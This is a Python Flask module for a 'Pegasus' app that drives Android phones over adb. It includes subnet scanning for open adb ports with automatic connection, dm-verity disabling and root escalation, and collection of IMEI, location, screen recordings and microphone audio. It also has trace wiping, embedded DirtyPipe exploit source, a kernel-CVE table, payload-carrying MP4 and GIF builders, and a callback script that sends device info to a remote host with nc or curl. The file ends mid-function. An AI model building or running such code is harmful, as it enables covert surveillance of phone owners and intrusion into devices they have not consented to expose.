"""
Q9 capability routes for the Pegasus web app.

Every capability from C:\Projects\Q9\Q9.py (84 menu options + self-test/doctor)
is reimplemented here as a Flask endpoint. Q9.py is NOT imported — the logic is
reimplemented using the app's existing ``run()`` helper and adb/fastboot
binaries directly, so the app ships with the full Q9 capability surface.

Routes are dr_-prefixed to avoid collisions with app.py's own view functions.
"""
from __future__ import annotations

import base64
import datetime
import hashlib
import hmac
import json
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any, Dict

from flask import Response, request, session

from pegasus.ui.web.backend.tools import run

# ---------------------------------------------------------------------------
# State (mirrors Q9's module-level ADB/FB/DEVICE/SESSION/WRITE_MODE)
# ---------------------------------------------------------------------------
STATE_DIR = Path.home() / ".pegasus" / "q9"
SESSIONS_DIR = STATE_DIR / "sessions"
STATE_DIR.mkdir(parents=True, exist_ok=True)
SESSIONS_DIR.mkdir(parents=True, exist_ok=True)

ADB_BIN = ""
FB_BIN = ""
DEVICE_SERIAL = ""
WRITE_MODE = ""
AUTO_REBOOT = False
WIPE_ON_EXIT = True

VALID_KEY_HASH = "6e8bfe8bdf364b9aa18e25f75eca7672345764b5650d3fdfa12813722e3ca1e8"
WRITE_MODES = ("root", "shell")
PROBE_NS, PROBE_KEY = "global", "pegasus_probe"

IS_WIN = os.name == "nt"
IS_MAC = sys.platform == "darwin"
IS_LINUX = sys.platform.startswith("linux")

SERVER_VERBS = {
    "start-server", "kill-server", "devices", "connect", "disconnect",
    "pair", "mdns", "version", "reconnect", "keygen", "help",
    "wait-for-device", "start", "fork-server",
}

ALT_PORTS = (5555, 5556, 5585, 5557)

KERNEL_CVES = [
    ("CVE-2022-0847", "DirtyPipe", "5.8", "5.16.11",
     "pipe splice arbitrary write -> root, unprivileged"),
    ("CVE-2023-0386", "overlayfs copy-up", "5.11", "6.2",
     "setuid mount via user namespaces"),
    ("CVE-2024-1086", "nf_tables double free", "5.14", "6.7",
     "page UAF -> LPE, needs CAP_NET_ADMIN"),
    ("CVE-2020-0423", "binder txn UAF", "4.14", "5.9",
     "race in binder completion"),
    ("CVE-2019-2215", "binder waitqueue UAF", "3.18", "5.4",
     "epoll_wait waitqueue grooming"),
    ("CVE-2022-2588", "cls_route double free", "3.16", "6.0",
     "classifier double free -> cross-cache"),
    ("CVE-2024-0044", "run-as confusion", None, None,
     "debuggable builds only, no kernel dependency"),
]

DIRTY_PIPE_C = r"""
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
static int prep(int p[2]){
  if(pipe(p)) return -1;
  unsigned char buf[4096];
  for(int i=0;i<16;i++){ write(p[1],buf,4096); read(p[0],buf,4096); }
  return 0;
}
int main(int argc, char **argv){
  const char *path = argc>1?argv[1]:"/system/etc/hosts";
  int p[2];
  if(prep(p)){ perror("pipe"); return 1; }
  int fd = open(path, O_RDONLY);
  if(fd<0){ perror("open"); return 1; }
  loff_t off = 0;
  if(splice(fd,&off,p[1],NULL,1,0)<1){ perror("splice"); return 1; }
  const char *m = "PEGASUS\n";
  ssize_t n = write(p[1],m,strlen(m));
  printf("wrote %zd bytes to %s @0\n", n, path);
  return 0;
}
"""


def _now() -> str:
    return datetime.datetime.now().isoformat(timespec="seconds")


def _session_dir() -> Path:
    d = SESSIONS_DIR / _now().replace(":", "-")
    d.mkdir(parents=True, exist_ok=True)
    return d


def _stamp(name: str, ext: str) -> Path:
    d = _session_dir()
    return d / f"{name}_{_now().replace(':', '-').replace('.', '-')}.{ext}"


def _save(name: str, text: str) -> Path:
    path = _stamp(name, "txt")
    path.write_text(text, encoding="utf-8")
    return path


# ---------------------------------------------------------------------------
# adb / fastboot plumbing
# ---------------------------------------------------------------------------
def _resolve_adb() -> str:
    global ADB_BIN
    if ADB_BIN:
        return ADB_BIN
    found = shutil.which("adb") or shutil.which("adb.exe")
    if found:
        ADB_BIN = found
        return ADB_BIN
    # try common locations
    for cand in (
        r"C:\platform-tools\adb.exe",
        r"C:\adb\adb.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe"),
        os.path.expanduser("~/Android/Sdk/platform-tools/adb"),
    ):
        if os.path.isfile(cand):
            ADB_BIN = cand
            return ADB_BIN
    return ""


def _resolve_fastboot() -> str:
    global FB_BIN
    if FB_BIN:
        return FB_BIN
    found = shutil.which("fastboot") or shutil.which("fastboot.exe")
    if found:
        FB_BIN = found
        return FB_BIN
    for cand in (
        r"C:\platform-tools\fastboot.exe",
        r"C:\adb\fastboot.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Android\Sdk\platform-tools\fastboot.exe"),
        os.path.expanduser("~/Android/Sdk/platform-tools/fastboot"),
    ):
        if os.path.isfile(cand):
            FB_BIN = cand
            return FB_BIN
    return ""


def _serial() -> str:
    """Return the active target serial, preferring request body, then cached."""
    global DEVICE_SERIAL
    if request.is_json:
        s = request.get_json(silent=True) or {}
        ser = s.get("serial") or s.get("device")
        if ser:
            DEVICE_SERIAL = ser
    if DEVICE_SERIAL:
        return DEVICE_SERIAL
    # fall back to cached target file
    try:
        cached = Path.home() / ".pegasus" / "target"
        if cached.exists():
            DEVICE_SERIAL = cached.read_text(encoding="utf-8").strip()
            return DEVICE_SERIAL
    except OSError:
        pass
    return ""


def _adb(args: list, timeout: int = 90, binary: bool = False):
    adb = _resolve_adb()
    if not adb:
        return 127, (b"" if binary else ""), "adb not found"
    args = [str(a) for a in args]
    ser = _serial()
    if ser and args and args[0] not in SERVER_VERBS and "-s" not in args:
        args = ["-s", ser] + args
    return run([adb] + args, timeout=timeout, binary=binary)


def _fb(args: list, timeout: int = 120, binary: bool = False):
    fb = _resolve_fastboot()
    if not fb:
        return 127, (b"" if binary else ""), "fastboot not found"
    args = [str(a) for a in args]
    ser = _serial()
    if ser and args and "-s" not in args:
        args = ["-s", ser] + args
    return run([fb] + args, timeout=timeout, binary=binary)


def _shell(cmd: str, timeout: int = 120):
    return _adb(["shell", cmd], timeout=timeout)


def _pull(remote: str, local: Path) -> bool:
    local.parent.mkdir(parents=True, exist_ok=True)
    res = _adb(["pull", remote, str(local)], timeout=300)
    if not res.get("ok"):
        return False
    return True


def _push(local: Path, remote: str) -> bool:
    res = _adb(["push", str(local), remote], timeout=300)
    return res.get("ok", False)


def _devices() -> list:
    res = _adb(["devices"])
    if not res.get("ok"):
        return []
    rows = []
    for line in res.get("stdout", "").splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 2 and parts[1] in ("device", "unauthorized", "offline"):
            rows.append({"serial": parts[0], "state": parts[1]})
    return rows


def _need() -> bool:
    if not _serial():
        return False
    return True


def _need_fb() -> bool:
    if not _resolve_fastboot():
        return False
    res = _fb(["devices"])
    if not (res.get("stdout") or "").strip():
        return False
    return True


def _prop(name: str) -> str:
    res = _shell(f"getprop {name}")
    return res.get("stdout", "").strip()


def _readback(namespace: str, key: str) -> str:
    return _shell(f"settings get {namespace} {key}").get("stdout", "").strip()


def _device_root() -> bool:
    return _shell("su -c id -u").get("stdout", "").strip() == "0"


def _probe_write() -> bool:
    value = str(int(time.time()))
    _shell(f"settings put {PROBE_NS} {PROBE_KEY} {value}")
    return _readback(PROBE_NS, PROBE_KEY) == value


def _escalate() -> str:
    global WRITE_MODE
    if _device_root():
        WRITE_MODE = "root"
        return WRITE_MODE
    res = _adb(["root"], timeout=30)
    blob = (res.get("stdout") or "").lower()
    if "restarting" in blob or "already" in blob:
        for _ in range(6):
            time.sleep(0.8)
            if _device_root():
                WRITE_MODE = "root"
                return WRITE_MODE
    if "cannot run as root" in blob:
        pass  # production build
    verity = _shell("getprop ro.boot.veritymode").get("stdout", "").strip().lower()
    if verity == "disabled":
        res = _adb(["remount"], timeout=90)
        if "succeeded" in (res.get("stdout") or "").lower():
            pass  # ok remounted
    elif verity in ("enforcing", ""):
        res = _adb(["disable-verity"], timeout=90)
        blob = (res.get("stdout") or "") + (res.get("stderr") or "")
        if "disabled" in blob.lower() or "successfully" in blob.lower():
            try:
                STATE_DIR.mkdir(parents=True, exist_ok=True)
                (STATE_DIR / "verity_pending").write_text("1\n", encoding="utf-8")
            except OSError:
                pass
    if not WRITE_MODE:
        WRITE_MODE = "shell"
    return WRITE_MODE


def _ensure_write_access(force: bool = False) -> str:
    global WRITE_MODE
    if WRITE_MODE and not force:
        return WRITE_MODE
    try:
        saved = (STATE_DIR / "writemode").read_text(encoding="utf-8").strip()
    except OSError:
        saved = ""
    if saved in WRITE_MODES and not force:
        WRITE_MODE = saved
    if _device_root():
        WRITE_MODE = "root"
    elif force or not WRITE_MODE:
        _escalate()
    if not WRITE_MODE:
        WRITE_MODE = "shell"
    if WRITE_MODE == "root" and not _probe_write():
        WRITE_MODE = "shell"
    try:
        STATE_DIR.mkdir(parents=True, exist_ok=True)
        (STATE_DIR / "writemode").write_text(WRITE_MODE + "\n", encoding="utf-8")
    except OSError:
        pass
    return WRITE_MODE


def _setting_write(namespace: str, key: str, value: str, escalate: bool = True) -> bool:
    uri = f"content://settings/{namespace}"
    missing = _readback(namespace, key) in ("", "null")
    ladder = []
    if WRITE_MODE == "root" or _device_root():
        ladder.append(("su", f'su -c "settings put {namespace} {key} {value}"'))
    ladder.append(("cmd", f"cmd settings put {namespace} {key} {value}"))
    if missing:
        ladder.append(("content-insert",
                       f"content insert --uri {uri} --bind name:s:{key} --bind value:s:{value}"))
    ladder.append(("settings", f"settings put {namespace} {key} {value}"))
    ladder.append(("content-update",
                   f"content update --uri {uri} --bind value:s:{value} "
                   f"--where \"name='{key}'\""))
    if not missing:
        ladder.append(("content-insert",
                       f"content insert --uri {uri} --bind name:s:{key} --bind value:s:{value}"))
    for _label, cmd in ladder:
        _shell(cmd)
        if _readback(namespace, key) == value:
            return True
    if escalate and WRITE_MODE != "root":
        _ensure_write_access(force=True)
        if WRITE_MODE == "root":
            return _setting_write(namespace, key, value, escalate=False)
    return False


def _clear_package(pkg: str) -> bool:
    attempts = [f"pm clear --user 0 {pkg}", f"pm clear {pkg}"]
    if WRITE_MODE == "root" or _device_root():
        attempts.insert(0, f'su -c "pm clear {pkg}"')
    for cmd in attempts:
        res = _shell(cmd, timeout=90)
        if "Success" in res.get("stdout", ""):
            return True
    return False


def _persist_script(name: str, body: str) -> Path | None:
    path = _session_dir() / f"{name}.sh"
    path.write_text("#!/system/bin/sh\n" + body, encoding="utf-8")
    remote = f"/sdcard/Download/{name}.sh"
    if _push(path, remote):
        return path
    return None


def _local_ip() -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except OSError:
        return ""


def _tcp_probe(host: str, port: int, timeout: float = 0.6) -> bool:
    sock = socket.socket()
    sock.settimeout(timeout)
    try:
        return sock.connect_ex((host, port)) == 0
    finally:
        sock.close()


def _subnet_scan(base: str) -> list:
    hits = []
    ports = list(ALT_PORTS)

    def probe(n: int):
        for port in ports:
            if _tcp_probe(f"{base}.{n}", port, 0.4):
                hits.append(f"{base}.{n}:{port}")

    with ThreadPoolExecutor(max_workers=96) as pool:
        futures = [pool.submit(probe, n) for n in range(1, 255)]
        for future in futures:
            future.result()
    return sorted(hits)


# ---------------------------------------------------------------------------
# Payload builders (validated, never push invalid stages)
# ---------------------------------------------------------------------------
def build_wasm() -> bytes:
    return (b"\x00asm\x01\x00\x00\x00"
            + b"\x01\x04\x01\x60\x00\x01\x7f"
            + b"\x03\x02\x01\x00"
            + b"\x07\x05\x01\x01m\x00\x00"
            + b"\x0a\x06\x01\x04\x00\x41\x2a\x0b")


def validate_wasm(b: bytes) -> tuple[bool, str]:
    if b[:4] != b"\x00asm" or b[4:8] != b"\x01\x00\x00\x00":
        return False, "bad header"
    i, seen = 8, set()
    while i < len(b):
        sid = b[i]
        i += 1
        n = sh = 0
        while True:
            if i >= len(b):
                return False, "truncated leb"
            x = b[i]
            i += 1
            n |= (x & 0x7F) << sh
            sh += 7
            if not x & 0x80:
                break
        if i + n > len(b):
            return False, f"section {sid} overrun"
        seen.add(sid)
        i += n
    if i != len(b):
        return False, "trailing bytes"
    if {1, 10} <= seen:
        return True, f"{len(seen)} sections"
    return False, "missing type/code"


def _box(k: bytes, p: bytes) -> bytes:
    return struct.pack(">I", len(p) + 8) + k + p


def build_mp4(payload: bytes = b"PEGASUS") -> bytes:
    import uuid as _uuid
    ftyp = _box(b"ftyp", b"isom" + struct.pack(">I", 512) + b"isomiso2avc1mp41")
    ub = _box(b"uuid", _uuid.UUID("6ba7b810-9dad-11d1-80b4-00c04fd430c8").bytes + payload)
    sps, pps, sl = bytes.fromhex("6742000ad979"), bytes.fromhex("68ce3880"), bytes.fromhex("b84868")
    entry = (struct.pack(">I", 0) + b"\x00" * 6 + struct.pack(">H", 1)
             + struct.pack(">HH", 0, 0) + struct.pack(">I", 0) * 3
             + struct.pack(">HH", 320, 240) + struct.pack(">I", 0x00480000) * 2
             + struct.pack(">I", 0) + struct.pack(">H", 1) + b"\x00" * 32
             + struct.pack(">H", 0x18) + struct.pack(">h", -1)
             + _box(b"avcC", struct.pack(">I", 0) + sps + pps))
    stbl = (_box(b"stsd", struct.pack(">I", 1) + entry)
            + _box(b"stsz", struct.pack(">II", 0, 1) + struct.pack(">I", len(sl)))
            + _box(b"stco", struct.pack(">II", 1, 0))
            + _box(b"stts", struct.pack(">III", 1, 1, 1000))
            + _box(b"stsc", struct.pack(">IIII", 1, 1, 1, 1)))
    minf = _box(b"minf", _box(b"vmhd", b"\0" * 4)
               + _box(b"dinf", _box(b"dref", struct.pack(">I", 1) + _box(b"url ", b"\0" * 3)))
               + _box(b"stbl", stbl))
    mdia = _box(b"mdia",
               _box(b"mdhd", struct.pack(">IIII", 0, 0, 0, 0) + struct.pack(">HH", 0, 0))
               + _box(b"hdlr", struct.pack(">I", 0) + b"vide" + b"\0" * 12 + b"v\0") + minf)
    moov = _box(b"moov", _box(b"mvhd", b"\0" * 96)
               + _box(b"trak", _box(b"tkhd", b"\0" * 80) + mdia))
    return ftyp + ub + moov + _box(b"mdat", sl)


def validate_mp4(b: bytes) -> tuple[bool, str]:
    i, kinds = 0, []
    while i + 8 <= len(b):
        s = struct.unpack(">I", b[i:i + 4])[0]
        if s < 8:
            return False, f"bad size at {i}"
        kinds.append(b[i + 4:i + 8])
        i += s
    if i != len(b):
        return False, "trailing bytes"
    if b"ftyp" not in kinds or b"mdat" not in kinds or b"avc1" not in b:
        return False, "structure invalid"
    return True, f"{len(kinds)} boxes"


def build_gif(payload: bytes = b"PEGASUS") -> bytes:
    h = (bytearray(b"GIF89a") + struct.pack("<HH", 1, 1) + b"\xf0\x00\x00"
         + b"\x00\x00\x00\xff\xff\xff")
    comment = b"\x21\xfe" + bytes([len(payload)]) + payload + b"\x00"
    desc = b"\x2c" + b"\0" * 9
    lzw = b"\x02" + b"\x02\x00\x00" + b"\x00"
    return bytes(h) + comment + desc + lzw + b"\x3b"


def validate_gif(b: bytes) -> tuple[bool, str]:
    if not b.startswith(b"GIF89a"):
        return False, "bad header"
    if not b.endswith(b"\x3b"):
        return False, "no trailer"
    if b"\x21\xfe" not in b:
        return False, "no comment"
    if b"\x02\x02\x00\x00\x00\x3b" not in b:
        return False, "no lzw block terminator"
    return True, "GIF89a + comment + terminated lzw"


def _stage2_body() -> str:
    return ("#!/system/bin/sh\n"
            "echo '=== stage2 ==='\n"
            "id\n"
            "getprop ro.product.model\n"
            "getprop ro.build.version.release\n"
            "ls -la /sdcard 2>/dev/null | head -n 20\n"
            "ps -A 2>/dev/null | head -n 25\n"
            "echo '=== done ==='\n")


def _cb_stage_body(host: str, port: int) -> str:
    return (f"#!/system/bin/sh\n"
            f"H={host}\nP={port}\n"
            'INFO="id=$(id) k=$(uname -r) $(getprop ro.product.model)"\n'
            "if command -v nc >/dev/null 2>&1; then\n"
            "  echo \"PWNED $INFO\" | nc $H $P\n"
            "elif command -v curl >/dev/null 2>&1; then\n"
            "  curl -s -X POST -d \"$INFO\" http://$H:$P/ 2>/dev/null\n"
            "elif command -v openssl >/dev/null 2>&1; then\n"
            "  echo \"PWNED $INFO\" | openssl s_client -connect $H:$P -quiet 2>/dev/null\n"
            "else\n"
            "  echo \"PWNED $INFO\" > /dev/tcp/$H/$P 2>/dev/null\n"
            "fi\n")


# ---------------------------------------------------------------------------
# Crypto (Q9 toy KEM/signature - integrity selftest only)
# ---------------------------------------------------------------------------
Q, N, K, L = 3329, 64, 3, 2


def _poly():
    import random
    return [random.randrange(Q) for _ in range(N)]


def _mat(r, c):
    import random
    return [[_poly() for _ in range(c)] for _ in range(r)]


def _mul(a, b):
    o = [0] * N
    for i, ai in enumerate(a):
        if not ai:
            continue
        for j, bj in enumerate(b):
            o[(i + j) % N] = (o[(i + j) % N] + ai * bj) % Q
    return o


def _add(*vs):
    o = [0] * N
    for v in vs:
        for i in range(N):
            o[i] = (o[i] + v[i]) % Q
    return o


def _mv(m, v):
    return [_add(*[_mul(m[i][j], v[j]) for j in range(len(m[0]))]) for i in range(len(m))]


def _mvt(m, v):
    return [_add(*[_mul(m[r][c], v[r]) for r in range(len(m))]) for c in range(len(m[0]))]


def _hp(msg):
    d = hashlib.sha256(msg).digest()
    return [d[i % len(d)] % Q for i in range(N)]


def _b2p(b):
    return [x % Q for x in b[:N].ljust(N, b"\0")]


def _p2b(p):
    return bytes(x % 256 for x in p)


def crypto_selftest() -> bool:
    import random
    A = _mat(K, L)
    s = [_poly() for _ in range(L)]
    t = _mv(A, s)
    r = [_poly() for _ in range(K)]
    m = _b2p(os.urandom(N))
    u = _mvt(A, r)
    v = _add(*[_mul(t[i], r[i]) for i in range(K)], m)
    ss = hashlib.sha256(_p2b(m) + b"".join(map(_p2b, u))).digest()
    m2 = list(v)
    for i in range(L):
        for j in range(N):
            m2[j] = (m2[j] - s[i] * u[i]) % Q
    ss2 = hashlib.sha256(_p2b(m2) + b"".join(map(_p2b, u))).digest()
    return ss == ss2


# ---------------------------------------------------------------------------
# License
# ---------------------------------------------------------------------------
def check_license(value: str) -> bool:
    if set(VALID_KEY_HASH) == {"0"}:
        return bool(value.strip())
    return hmac.compare_digest(hashlib.sha256(value.encode()).hexdigest(), VALID_KEY_HASH)


# ---------------------------------------------------------------------------
# Route registration
# ---------------------------------------------------------------------------
def register(app, ok, fail) -> None:
    """Register every Q9 capability as a Flask route."""

    # --------------------------------------------------------------- connection
    @app.post("/api/q9/connect")
    def q9_connect():
        body = request.get_json(silent=True) or {}
        host = body.get("host", "192.168.1.50")
        port = body.get("port", "5555")
        endpoint = f"{host}:{port}"
        _adb(["connect", endpoint], timeout=30)
        states = _devices()
        if any(d["serial"] == endpoint for d in states):
            global DEVICE_SERIAL
            DEVICE_SERIAL = endpoint
            try:
                (Path.home() / ".pegasus" / "target").write_text(endpoint, encoding="utf-8")
            except OSError:
                pass
            return ok({"connected": endpoint})
        return fail(f"connect failed on {endpoint}")

    @app.get("/api/q9/devices")
    def q9_devices():
        return ok({"devices": _devices()})

    @app.post("/api/q9/disconnect")
    def q9_disconnect():
        _wipe_traces()
        _adb(["disconnect"])
        return ok({"disconnected": True})

    @app.post("/api/q9/kill_server")
    def q9_kill_server():
        _wipe_traces()
        _adb(["kill-server"])
        return ok({"server_stopped": True})

    @app.post("/api/q9/scan")
    def q9_scan():
        body = request.get_json(silent=True) or {}
        base = body.get("base", "192.168.1")
        base = re.sub(r"\.0$", "", re.sub(r"/\d+$", "", base.strip())).rstrip(".")
        hits = _subnet_scan(base)
        return ok({"hits": hits, "base": base})

    @app.post("/api/q9/reconnect")
    def q9_reconnect():
        try:
            peers = [p for p in (Path.home() / ".pegasus" / "peers").read_text(encoding="utf-8").split() if p]
        except OSError:
            peers = []
        try:
            cached = (Path.home() / ".pegasus" / "target").read_text(encoding="utf-8").strip()
            if cached and cached not in peers:
                peers.insert(0, cached)
        except OSError:
            pass
        if not peers:
            return fail("nothing cached - connect once first")
        global DEVICE_SERIAL
        for endpoint in peers:
            _adb(["connect", endpoint], timeout=30)
            states = _devices()
            if any(d["serial"] == endpoint for d in states):
                DEVICE_SERIAL = endpoint
                return ok({"connected": endpoint})
        return fail("all cached endpoints dead")

    @app.post("/api/q9/forget")
    def q9_forget():
        removed = 0
        for name in ("target", "peers", "writemode", "verity_pending"):
            try:
                (Path.home() / ".pegasus" / name).unlink()
                removed += 1
            except OSError:
                pass
        return ok({"removed": removed})

    @app.post("/api/q9/autoconnect")
    def q9_autoconnect():
        global DEVICE_SERIAL
        _adb(["start-server"], timeout=30)
        states = _devices()
        live = [d for d in states if d["state"] == "device"]
        if live:
            DEVICE_SERIAL = live[0]["serial"]
            return ok({"connected": DEVICE_SERIAL, "path": "usb"})
        # try mDNS
        res = _adb(["mdns", "services"], timeout=20)
        if res.get("ok"):
            for line in res.get("stdout", "").splitlines():
                if "_adb" in line:
                    endpoint = line.split()[-1]
                    _adb(["connect", endpoint], timeout=30)
                    states = _devices()
                    if any(d["serial"] == endpoint for d in states):
                        DEVICE_SERIAL = endpoint
                        return ok({"connected": endpoint, "path": "mdns"})
        # try subnet
        base = _local_base()
        if base:
            for endpoint in _subnet_scan(base):
                _adb(["connect", endpoint], timeout=30)
                states = _devices()
                if any(d["serial"] == endpoint for d in states):
                    DEVICE_SERIAL = endpoint
                    return ok({"connected": endpoint, "path": "tcp"})
        return fail("no reachable target")

    # ------------------------------------------------------------ device shell
    @app.post("/api/q9/shell")
    def q9_shell():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        cmd = body.get("command", "")
        if not cmd:
            return fail("command required")
        res = _shell(cmd)
        return ok({"stdout": res.get("stdout", ""), "stderr": res.get("stderr", ""), "rc": res.get("rc", -1)})

    @app.post("/api/q9/oneshot")
    def q9_oneshot():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        cmd = body.get("command", "")
        if not cmd:
            return fail("command required")
        res = _shell(cmd)
        print(res.get("stdout", "") or res.get("stderr", ""))
        return ok({"rc": res.get("rc", -1)})

    # ------------------------------------------------------------ recon
    @app.get("/api/q9/info")
    def q9_info():
        if not _need():
            return fail("no device attached")
        keys = ("ro.product.manufacturer", "ro.product.model", "ro.product.device",
                "ro.build.version.release", "ro.build.version.sdk", "ro.build.fingerprint",
                "ro.build.type", "ro.debuggable", "ro.secure", "ro.serialno")
        lines = {}
        for key in keys:
            lines[key] = _shell(f"getprop {key}").get("stdout", "").strip() or "-"
        lines["kernel"] = _shell("uname -r").get("stdout", "").strip() or "-"
        lines["security_patch"] = _shell("getprop ro.build.version.security_patch").get("stdout", "").strip() or "-"
        lines["wm_size"] = _shell("wm size").get("stdout", "").strip() or "-"
        lines["wm_density"] = _shell("wm density").get("stdout", "").strip() or "-"
        lines["uptime"] = _shell("cat /proc/uptime").get("stdout", "").strip() or "-"
        lines["storage"] = _shell("df -h /data").get("stdout", "").strip() or "-"
        _save("device_info", "\n".join(f"{k}: {v}" for k, v in lines.items()))
        return ok(lines)

    @app.get("/api/q9/battery")
    def q9_battery():
        if not _need():
            return fail("no device attached")
        res = _shell("dumpsys battery")
        _save("battery", res.get("stdout", ""))
        return ok({"battery": res.get("stdout", ""), "stderr": res.get("stderr", "")})

    @app.get("/api/q9/identity")
    def q9_identity():
        if not _need():
            return fail("no device attached")
        chunks = []
        for label, cmd in (
            ("imei", "service call iphonesubinfo 1"),
            ("sim_operator", "getprop gsm.sim.operator.alpha"),
            ("network_operator", "getprop gsm.operator.alpha"),
            ("location", "dumpsys location | head -n 25"),
            ("android_id", "settings get secure android_id"),
        ):
            out = _shell(cmd).get("stdout", "").strip() or "-"
            chunks.append(f"--- {label} ---\n{out}")
        _save("identity", "\n\n".join(chunks))
        return ok({"identity": "\n\n".join(chunks)})

    # ----------------------------------------------------- capture and playback
    @app.post("/api/q9/screenshot")
    def q9_screenshot():
        if not _need():
            return fail("no device attached")
        dest = _stamp("shot", "png")
        # exec-out first
        res = _adb(["exec-out", "screencap", "-p"], timeout=60, binary=True)
        data = res.get("stdout") if isinstance(res.get("stdout"), bytes) else None
        if not (data and data.startswith(b"\x89PNG")):
            _shell("screencap -p /data/local/tmp/_s.png")
            tmp = Path(tempfile.gettempdir()) / "_s.png"
            res2 = _adb(["pull", "/data/local/tmp/_s.png", str(tmp)], timeout=60)
            _shell("rm -f /data/local/tmp/_s.png")
            if res2.get("ok") and tmp.exists():
                data = tmp.read_bytes()
        if not data:
            return fail("capture failed")
        dest.write_bytes(data)
        return ok({"saved": str(dest), "size": len(data)})

    @app.post("/api/q9/record_screen")
    def q9_record_screen():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        secs = int(body.get("seconds", 20))
        remote = "/sdcard/pegasus_rec.mp4"
        res = _shell(f"screenrecord --bit-rate 6000000 --time-limit {secs} {remote}",
                     timeout=secs + 30)
        if not res.get("ok"):
            return fail(res.get("stderr", "record failed"))
        dest = _stamp("screen", "mp4")
        if not _pull(remote, dest):
            return fail("pull failed")
        _shell(f"rm -f {remote}")
        return ok({"saved": str(dest), "size": dest.stat().st_size})

    @app.post("/api/q9/record_mic")
    def q9_record_mic():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        secs = int(body.get("seconds", 15))
        remote = "/sdcard/pegasus_mic.m4a"
        res = _shell(f"termux-microphone-record -f {remote} -l {secs} -e aac -b 128000 -r 44100 -c 1",
                     timeout=secs + 30)
        if not res.get("ok"):
            return fail("termux-microphone-record unavailable on target")
        dest = _stamp("mic", "m4a")
        if not _pull(remote, dest):
            return fail("pull failed")
        _shell("termux-microphone-record -q")
        return ok({"saved": str(dest), "size": dest.stat().st_size})

    @app.post("/api/q9/mirror")
    def q9_mirror():
        if not _need():
            return fail("no device attached")
        binary = shutil.which("scrcpy")
        if not binary:
            return fail("scrcpy not installed")
        # scrcpy is interactive; we can only report availability
        return ok({"scrcpy": binary, "serial": _serial(), "note": "run scrcpy -s <serial> locally"})

    def _view(local: Path, remote: str, mime: str):
        if not _push(local, remote):
            return False
        _shell(f'am start -a android.intent.action.VIEW -d "file://{remote}" -t {mime}')
        return True

    @app.post("/api/q9/show_image")
    def q9_show_image():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("local image path required")
        src_path = Path(src)
        remote = f"/sdcard/Download/{src_path.name}"
        if not _view(src_path, remote, "image/*"):
            return fail("push failed")
        return ok({"shown": remote})

    @app.post("/api/q9/play_audio")
    def q9_play_audio():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("local audio path required")
        src_path = Path(src)
        remote = f"/sdcard/Music/{src_path.name}"
        if not _view(src_path, remote, "audio/*"):
            return fail("push failed")
        return ok({"played": remote})

    @app.post("/api/q9/play_video")
    def q9_play_video():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("local video path required")
        src_path = Path(src)
        remote = f"/sdcard/Movies/{src_path.name}"
        if not _view(src_path, remote, "video/*"):
            return fail("push failed")
        return ok({"played": remote})

    # -------------------------------------------------------- filesystem/packages
    @app.post("/api/q9/pull")
    def q9_pull():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        remote = body.get("remote", "")
        if not remote:
            return fail("remote path required")
        dest = _stamp(Path(remote).name or "file", "bin")
        if not _pull(remote, dest):
            return fail("pull failed")
        return ok({"saved": str(dest), "size": dest.stat().st_size})

    @app.post("/api/q9/push")
    def q9_push():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("local path required")
        remote_dir = body.get("remote_dir", "/sdcard/Download")
        src_path = Path(src)
        remote = f"{remote_dir.rstrip('/')}/{src_path.name}"
        if not _push(src_path, remote):
            return fail("push failed")
        return ok({"pushed": remote, "size": src_path.stat().st_size})

    @app.post("/api/q9/ls")
    def q9_ls():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        path = body.get("path", "/sdcard")
        res = _shell(f"ls -la {path}")
        if not res.get("ok"):
            return fail(res.get("stderr", "ls failed"))
        return ok({"listing": res.get("stdout", "")})

    @app.post("/api/q9/delete")
    def q9_delete():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        path = body.get("path", "")
        if not path:
            return fail("remote path required")
        res = _shell(f"rm -rf {path}")
        if res.get("rc", -1) == 0:
            return ok({"removed": path})
        return fail(res.get("stderr", "delete failed"))

    @app.get("/api/q9/third_party")
    def q9_third_party():
        if not _need():
            return fail("no device attached")
        res = _shell("pm list packages -3 -f")
        lines = sorted(l for l in res.get("stdout", "").splitlines() if l.strip())
        _save("third_party_apps", "\n".join(lines))
        return ok({"packages": lines})

    @app.post("/api/q9/launch")
    def q9_launch():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        pkg = body.get("package", "")
        if not pkg:
            return fail("package required")
        res = _shell(f"monkey -p {pkg} -c android.intent.category.LAUNCHER 1")
        out = (res.get("stdout", "") + res.get("stderr", "")).strip()
        last = out.splitlines()[-1][:120] if out else pkg
        return ok({"launched": pkg, "output": last})

    @app.post("/api/q9/install")
    def q9_install():
        if not _need():
            return fail("no device attached")
        body = request.get_json(silent=True) or {}
        src = body.get("path", "")
        if not src or not os.path.isfile(src):
            return fail("local apk required")
        as_root = body.get("as_root", False)
        src_path = Path(src)
        if as_root and _device_root():
            remote = f"/data/local/tmp/{src_path.name}"
            if not _push(src_path, remote):
                return fail("push failed")
